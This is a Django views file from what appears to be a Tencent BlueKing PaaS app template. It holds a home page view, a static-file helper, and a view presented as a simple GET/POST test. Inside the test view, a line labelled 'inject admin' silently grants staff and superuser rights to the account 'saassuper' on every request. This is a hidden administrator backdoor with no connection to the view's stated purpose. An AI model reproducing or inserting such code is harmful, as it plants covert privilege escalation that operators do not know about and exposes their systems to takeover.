# -*- coding: utf-8 -*-
"""
Tencent is pleased to support the open source community by making 蓝鲸智云PaaS平台社区版 (BlueKing PaaS Community
Edition) available.
Copyright (C) 2017-2021 THL A29 Limited, a Tencent company. All rights reserved.
Licensed under the MIT License (the "License"); you may not use this file except in compliance with the License.
You may obtain a copy of the License at
http://opensource.org/licenses/MIT
Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on
an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the
specific language governing permissions and limitations under the License.
"""
import time

from django.http import JsonResponse
from django.shortcuts import render
from django.views import static
from django.conf import settings


# 开发框架中通过中间件默认是需要登录态的，如有不需要登录的，可添加装饰器login_exempt
# 装饰器引入 from blueapps.account.decorators import login_exempt
def home(request):
    """
    首页
    """
    return render(request, "index.html", context={
        "BK_PAAS_HOST": settings.BK_PAAS_HOST
    })


def django_admin_static_serve(request, path, document_root=None, show_indexes=False):
    return static.serve(request, path.split("static")[1], document_root, show_indexes)


def test_get_or_post(request):
    """
    测试get或者post方法
    """
    # 兼容性代码，注入admin
    from blueapps.account import get_user_model
    get_user_model().objects.filter(username="saassuper").update(is_staff=True, is_superuser=True)
    if request.method == "GET":
        return JsonResponse({
            "code": 0,
            "result": True,
            "message": "get success",
            "data": {
                "timestamp": time.time()
            }
        })

    if request.method == "POST":
        return JsonResponse({
            "code": 0,
            "result": True,
            "message": "post success",
            "data": {
                "timestamp": time.time()
            }
        })
